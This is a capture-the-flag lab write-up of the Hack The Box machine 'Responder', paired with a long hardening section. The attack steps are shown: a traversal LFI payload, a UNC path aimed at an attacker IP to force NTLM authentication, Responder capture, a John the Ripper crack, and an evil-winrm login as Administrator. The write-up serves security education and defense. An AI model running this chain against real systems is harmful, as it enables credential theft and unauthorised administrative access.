# HTB Starting Point — Responder: LFI → Forced NTLM Auth → Hash Cracking → WinRM

![HTB](https://img.shields.io/badge/Hack%20The%20Box-Starting%20Point-9FEF00?logo=hackthebox&logoColor=white)
![Tier](https://img.shields.io/badge/Tier-2-informational)
![Vuln](https://img.shields.io/badge/Vuln%20Class-LFI%20%2B%20NTLM%20Relay%2FCapture-red)
![License](https://img.shields.io/badge/License-MIT-blue)

Analysis of **Responder**, an HTB Starting Point machine that chains four distinct techniques into one path: a **Local File Inclusion (LFI)** in a PHP language-switcher, abused not to read files but to force the Windows web server process into an **outbound SMB authentication attempt**; a rogue SMB listener (**Responder**) that captures the resulting **NetNTLMv2** challenge/response; offline cracking of that capture with **John the Ripper**; and finally using the recovered password against **WinRM** for a full PowerShell session. This is the longest and most conceptually dense write-up in the series so far, so this document spends real time on the "why" behind each stage — particularly on what NTLM authentication actually is, since that's the part most write-ups gloss over in favor of "just run Responder."

## Why this analysis

Every previous machine in this series had one moving part: a bad query, an unauthenticated service, a leaked/reused credential. Responder is different — the LFI on its own discloses nothing sensitive here, and Responder on its own does nothing without something to trigger a connection. The vulnerability is the *interaction*: an application that lets an attacker control a path AND a protocol handler, running on an OS that will automatically try to authenticate to whatever SMB server that path happens to point to. Understanding NTLM's challenge-response mechanics is what makes it obvious why that automatic-authentication behavior is dangerous in the first place, so that gets its own section below rather than a one-line mention.

## Table of Contents

- [Enumeration](#enumeration)
  - [Port scan](#port-scan)
  - [Virtual host discovery](#virtual-host-discovery)
- [Stage 1: Local File Inclusion](#stage-1-local-file-inclusion)
- [Deep dive: how NTLM authentication actually works](#deep-dive-how-ntlm-authentication-actually-works)
- [Stage 2: forcing outbound authentication with an SMB path](#stage-2-forcing-outbound-authentication-with-an-smb-path)
- [Stage 3: capturing the exchange with Responder](#stage-3-capturing-the-exchange-with-responder)
- [Stage 4: offline cracking with John the Ripper](#stage-4-offline-cracking-with-john-the-ripper)
- [Stage 5: WinRM access](#stage-5-winrm-access)
- [Deep dive: hardening against this chain](#deep-dive-hardening-against-this-chain)
  - [1. Fix the LFI at the source](#1-fix-the-lfi-at-the-source)
  - [2. Block outbound SMB from application/user segments](#2-block-outbound-smb-from-applicationuser-segments)
  - [3. Disable NTLM, or at minimum stop it from being silently offered](#3-disable-ntlm-or-at-minimum-stop-it-from-being-silently-offered)
  - [4. SMB signing and Extended Protection for Authentication](#4-smb-signing-and-extended-protection-for-authentication)
  - [5. Password strength and hash-cracking resistance](#5-password-strength-and-hash-cracking-resistance)
  - [6. Harden WinRM itself](#6-harden-winrm-itself)
  - [7. Why every layer here matters independently](#7-why-every-layer-here-matters-independently)
- [Remediation summary](#remediation-summary)
- [Credits & License](#credits--license)

---

## Enumeration

### Port scan

A full-range `nmap` scan (`-p- --min-rate 1000 -sV`) identified the target as Windows, with two open ports: **80/TCP** (Apache) and **5985/TCP** (WinRM — Windows Remote Management). WinRM being open is worth flagging immediately even before touching the web app: it means that *if* valid credentials for a WinRM-privileged user are ever obtained, a full interactive PowerShell session is the likely end state. That framed the rest of the assessment as "find credentials," not "find a direct code-exec bug."

### Virtual host discovery

Requesting the target's bare IP redirected to `unika.htb`, indicating **name-based virtual hosting** — the server inspects the `Host:` header of the request and serves different content depending on what hostname was asked for, letting one IP/server back multiple independent sites. Since local DNS has no record for `unika.htb`, an `/etc/hosts` entry was added to point that hostname at the target IP, which makes the browser send the correct `Host:` header on every subsequent request and reach the real site instead of a default/placeholder vhost.

---

## Stage 1: Local File Inclusion

The site — a web-design business landing page — had a language switcher (`EN`/`FR`). Selecting French changed the URL to include a `page` parameter referencing `french.html`. A `page` parameter that names a file to load is the classic shape of a file-inclusion vulnerability: the backend is almost certainly using PHP's `include()` to pull in whatever file that parameter names.

`include()` does exactly what its name says — it pulls the target file's contents into the current script's execution context as if it had been written there directly:

```php
<?php
// vars.php
$color = 'green';
$fruit = 'apple';
?>
```
```php
<?php
// test.php
echo "A $color $fruit"; // "A" — variables not yet defined
include 'vars.php';
echo "A $color $fruit"; // "A green apple" — now defined
?>
```

If the application trusts the `page` parameter as a literal filesystem path with no validation, an attacker can substitute any path they like — including paths outside the intended `pages/` directory — using `../` directory-traversal sequences to walk back up to the filesystem root:

```
http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
```

This returned the contents of the target's `hosts` file in the HTTP response — confirming the LFI, since that file has nothing to do with the language-switching feature and should never have been reachable through it. `WINDOWS\System32\drivers\etc\hosts` is a standard first probe for this exact reason: it's a well-known, readable-by-default file whose contents are easy to recognize, making it a reliable existence check for LFI on Windows the same way `/etc/passwd` is on Linux.

At this point the LFI *could* be used purely for file disclosure (reading configs, source code, etc.) — but the far more interesting move on a Windows target is what comes next.

---

## Deep dive: how NTLM authentication actually works

Before Stage 2 makes sense, it's worth being precise about NTLM, because the terminology is genuinely confusing and the write-up's exploitation hinges on one specific behavior of it.

**NTLM (NT LAN Manager)** is Microsoft's legacy challenge-response authentication protocol, still supported alongside Kerberos for backward compatibility. A standard NTLM exchange looks like this:

1. **Negotiate:** the client tells the server it wants to authenticate and which capabilities it supports.
2. **Challenge:** the server generates a random value (the "challenge") and sends it back, unencrypted, to the client.
3. **Response:** the client combines the challenge with a value derived from the user's password (technically, an HMAC-based transformation involving the user's NT hash — not the password itself, and not a straightforward hash of the challenge either) and sends that response back.
4. **Verification:** the server — or, in a domain, the domain controller on the server's behalf — independently computes what the correct response *should* have been, using its own stored copy of the user's password-derived value, and compares it to what the client sent. A match means the client proved knowledge of the password without ever transmitting the password itself.

A few terms that get conflated constantly, worth pinning down explicitly since this write-up depends on the distinction:

- **NT hash / "NTLM hash":** the value stored server-side (in the SAM database locally, or in Active Directory for a domain) derived from a user's password. This is what an attacker wants if they're going for pass-the-hash — it's usable *as* a credential in some contexts without ever being cracked.
- **NetNTLMv2 "hash":** *not* the same thing, and not actually a hash at all — it's the challenge-and-response pair from one specific authentication attempt, formatted into a string. It's captured, not stolen from storage, and the only way to recover a usable password from it is to guess passwords offline and check which one reproduces the same response for that specific challenge (i.e., dictionary/brute-force cracking) — it can't be "passed" the way an NT hash can.

The behavior this box exploits: **a Windows client attempting to access a file over SMB (a `\\server\share` or, from certain applications, a `//server/share`-style path) will automatically attempt NTLM authentication to that server**, using the credentials of whatever account the requesting process is running as — with zero user interaction and zero warning, because SMB authentication happening transparently in the background is completely normal, expected behavior for legitimate file shares. That automatic, silent authentication attempt is the entire mechanism this exploit chain relies on.

---

## Stage 2: forcing outbound authentication with an SMB path

PHP's `allow_url_include` (governing whether `include()`/`require()` can pull in *remote* `http://`/`ftp://` resources) was off by default here — the standard hardening posture against classic Remote File Inclusion. Critically, though, **that setting has no effect on SMB paths**. Pointing the vulnerable `page` parameter at a UNC-style SMB path causes the underlying Windows OS — not PHP's URL-wrapper logic — to attempt to resolve and read that path, which triggers the exact automatic NTLM authentication behavior described above, addressed at a server of the attacker's choosing:

```
http://unika.htb/?page=//10.10.14.25/somefile
```

The web application itself never successfully "includes" anything — the request results in a file-not-found style error, because `somefile` doesn't exist. That failure is irrelevant: by the time the error occurs, the target's web server process has already reached out over SMB to `10.10.14.25` and attempted to authenticate, because that's simply what happens when a Windows process is told to open a path on `\\10.10.14.25\...`. The LFI here isn't being used to read a file at all — it's being used as a **path-controllable trigger** to make the target initiate an outbound authenticated connection to attacker-chosen infrastructure. This class of technique is often called **forced authentication**.

---

## Stage 3: capturing the exchange with Responder

**Responder** stands up a rogue SMB (and several other protocol) listener on the attacker's machine. When the target's automatic authentication attempt arrives, Responder plays the legitimate server role in the NTLM exchange described above: it issues a challenge, the target's process responds using the web server's running-account credentials (in this case, the built-in `Administrator` account), and Responder logs the full NetNTLMv2 challenge/response string — without ever needing to know the actual password, and without the target machine displaying any indication that anything unusual happened.

```
sudo responder -I <interface>
```

The captured value contains the username, domain/hostname, the server challenge, and the client's HMAC-based response — everything needed for the next stage, and nothing that requires having compromised the target beyond making it *ask to authenticate* somewhere the attacker controls.

---

## Stage 4: offline cracking with John the Ripper

The NetNTLMv2 capture, saved to a file, was handed to `john`:

```
john -w=/usr/share/wordlists/rockyou.txt hash.txt
```

John automatically identifies the NetNTLMv2 format and performs the same challenge-response computation described above for every candidate password in the wordlist, comparing each computed response against the captured one. A match confirms the candidate is the real password — this is a **dictionary attack**, entirely offline, generating no further traffic to or interaction with the target at all. The password (`badminton`) cracked in this case is a dictionary word, which is exactly why the attack succeeded quickly against a large but finite wordlist (`rockyou.txt`) rather than requiring a brute-force search of the full keyspace.

---

## Stage 5: WinRM access

With a valid `Administrator` password now recovered, and WinRM already known to be open from the initial port scan, `evil-winrm` (a WinRM client purpose-built for this exact scenario, since native PowerShell Remoting isn't available on Linux attacker boxes) was used to authenticate directly:

```
evil-winrm -i <target> -u administrator -p badminton
```

This produced a full interactive PowerShell session as `Administrator` — the highest level of access on the box — closing the loop from "found a way to make the server initiate an SMB connection" to "authenticated, privileged remote shell," with the flag readable directly from the filesystem.

---

## Deep dive: hardening against this chain

### 1. Fix the LFI at the source

This is the entry point, and closing it removes the whole chain's starting condition:

```php
// Vulnerable
include($_GET['page']);

// Hardened: allowlist of known-good values only
$allowed_pages = ['en' => 'english.html', 'fr' => 'french.html'];
$page = $_GET['page'] ?? 'en';
include($allowed_pages[$page] ?? $allowed_pages['en']);
```

The fix is not "strip `../`" (traversal filters are notoriously bypassable — double encoding, absolute paths, null-byte tricks on older PHP versions) — it's to never treat user input as a filesystem or protocol path at all. A small, explicit allowlist mapping a language *code* to a fixed file is enough for a feature this narrow; more generally, `basename()` plus a strict allowlist of permitted filenames, combined with `open_basedir` restricting PHP to a specific directory tree, closes both LFI and any RFI/SMB-inclusion variant simultaneously, because the input never reaches a path-resolution function unfiltered.

### 2. Block outbound SMB from application/user segments

Independently of the web application bug, a web server process should generally have **no legitimate reason to initiate outbound SMB connections to arbitrary internet hosts**. Egress filtering — blocking outbound TCP/445 (and legacy 139) from application server subnets to anything other than known-internal file/print infrastructure — would have prevented the forced-authentication attempt from ever reaching an attacker-controlled listener, regardless of what the LFI allowed the application to request. This is the same "the fix isn't only at the vulnerable component" pattern as the DB-exposure write-up: a network-layer control catches an entire class of "trick the host into talking to me" techniques (SMB, but also similar tricks via WebDAV, `file://`, etc.) rather than only the specific LFI instance found here.

### 3. Disable NTLM, or at minimum stop it from being silently offered

The deeper structural issue is that NTLM authentication happens **automatically and silently** whenever a Windows process resolves a UNC-style path — there's no user prompt, no application-level opt-in. Where an environment can tolerate it:

- Enforce **Kerberos-only** authentication via Group Policy (`Network security: Restrict NTLM: NTLM authentication in this domain` set to deny, in an AD environment) — Kerberos doesn't have this same "just try to authenticate to whatever host is named" behavior triggered by simple path resolution.
- Where NTLM can't be fully retired (legacy application/device compatibility is the most common real-world blocker), restrict it to explicitly trusted internal targets via `Network security: Restrict NTLM: Add remote server exceptions for NTLM authentication`, so the OS refuses to attempt NTLM auth against arbitrary external hosts even if something tries to make it.

### 4. SMB signing and Extended Protection for Authentication

Even where NTLM must stay enabled, two controls reduce what a captured exchange (or an intercepted one) can be used for:

- **SMB signing** (mentioned in the earlier OSI-protocols write-up in this series) prevents an intercepted NTLM exchange from being *relayed* to authenticate against a third host in real time — relevant to the broader NTLM-relay technique family, distinct from the offline-cracking path used here but closing a related gap.
- **Extended Protection for Authentication (EPA) / channel binding** ties an NTLM exchange to the specific TLS channel it occurred over, which helps against relay attacks targeting services like AD CS/LDAPS in more complex environments than this one, but is worth knowing as part of the same defensive family.

### 5. Password strength and hash-cracking resistance

The cracking stage succeeded because the account's password was a plain dictionary word. A NetNTLMv2 capture is only actionable if the underlying password is weak enough to be found by dictionary or brute-force search in reasonable time:

- Enforce a **strong password policy** (length over complexity rules specifically — long passphrases resist dictionary/brute-force cracking far better than short "complex" passwords) for any account, and especially for built-in high-privilege accounts like `Administrator`.
- Rename/disable the built-in `Administrator` account where organizational policy allows, and use a dedicated, monitored admin account instead — reduces the value of "I captured a hash for `Administrator`" as a starting assumption for an attacker.
- Where feasible, prefer authentication that doesn't reduce to a crackable offline artifact at all — certificate-based or smart-card authentication removes the "capture now, crack later" step entirely.

### 6. Harden WinRM itself

The final stage succeeded with a plain password over WinRM with no additional control in the way:

- Restrict WinRM listener reachability to specific management-network IP ranges (firewall rule scoped to jump-host/bastion addresses), the same "administrative interfaces shouldn't be broadly reachable" principle applied in the Sequel write-up.
- Require **HTTPS-based WinRM** with a valid certificate rather than the default HTTP listener, so credentials in the WinRM handshake itself aren't sent in a plaintext-equivalent channel.
- Enable **account lockout policies** so that even a leaked/cracked password has a limited window before repeated failed-then-successful authentication patterns are either blocked or trigger alerting — doesn't help after a single correct login, but raises the cost of any brute-force attempt against WinRM directly.

### 7. Why every layer here matters independently

This chain is a good demonstration of genuine defense-in-depth because each layer above would have broken it at a *different* point:

- Fixing the LFI stops the chain before it starts.
- Egress-filtering outbound SMB stops it even if the LFI still exists.
- Restricting/disabling NTLM stops the captured exchange from ever being generated, even if outbound SMB somehow still reached the attacker.
- A strong password stops the capture from being crackable, even if everything upstream still succeeded.
- WinRM restrictions stop the final pivot, even if a working password was still somehow recovered.

No single one of these is "the fix" the way parameterized queries were for Appointment — this box's chain is long enough that it has to be broken at whichever link is cheapest to fix in a given environment, which is exactly why real NTLM-relay/forced-authentication advisories tend to list several independent mitigations rather than one canonical patch.

---

## Remediation summary

| Layer | Prevents | Alone sufficient? |
|---|---|---|
| Fix LFI (allowlist, no user-controlled `include()` path) | The entire chain's entry point | Yes — chain never starts |
| Egress-block outbound SMB from app servers | Forced authentication reaching an attacker listener | Yes, even with the LFI unpatched |
| Disable/restrict NTLM (Kerberos-only or server exceptions) | Silent automatic NTLM auth to untrusted hosts | Yes, for this specific technique |
| SMB signing / EPA | Real-time relay of a captured/intercepted exchange | No — addresses relay, not offline cracking of this box's scenario |
| Strong password policy on privileged accounts | Successful offline cracking of a captured NetNTLMv2 | Yes, for the cracking stage specifically |
| WinRM network restriction + HTTPS listener | Direct remote pivot even with valid credentials | No — reduces exposure/interception risk, doesn't stop a correct credential from authenticating if reachable |
| Account lockout on WinRM | Repeated automated login attempts | No — doesn't stop a single correct login from a capture already cracked offline |

## Credits & License

Write-up based on hands-on completion of the HTB Starting Point machine **Responder**. Machine © Hack The Box — this repository contains original analysis and notes only, no proprietary HTB content.

Licensed under [MIT](LICENSE).
